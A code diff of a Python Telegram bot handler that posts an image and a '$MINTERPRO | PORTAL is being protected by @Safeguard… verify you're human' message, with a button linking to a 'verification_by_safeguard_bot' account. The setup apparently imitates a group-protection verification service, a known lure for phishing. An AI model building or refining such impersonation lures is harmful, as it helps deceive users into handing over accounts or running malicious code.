@@ -107,17 +107,17 @@ async def on_portal_access(event):
                     image_data = BytesIO(await response.read())  # Convert the content into a file-like object
                     image_data.name = 'image_verify_portal.jpg'  # Set a name for the file
 
-                    # Upload the photo
+                    # Upload the photo and send the message to the channel
                     uploaded_photo = await portal_bot_client.upload_file(image_data)
 
-                    # Send the message to the channel
-                    await portal_bot_client.send_file(
-                        entity=channel_id,
-                        file=uploaded_photo,
-                        caption=(
+                    # Send the message with the image and buttons using send_message
+                    message = await portal_bot_client.send_message(
+                        channel_id,  # Send to the channel using the channel ID
+                        message=(
                             "$MINTERPRO | PORTAL is being protected by @Safeguard\n\n"
                             "Click below to verify you're human"
                         ),
+                        file=uploaded_photo,
                         buttons=[
                             [Button.url("Tap to verify", "https://t.me/verification_by_safeguard_bot")]
                         ]
@@ -127,6 +127,7 @@ async def on_portal_access(event):
                     print(f"Failed to fetch the image. HTTP Status: {response.status}")
     except Exception as e:
         print(f"Error: {e}")
+
 
 
 
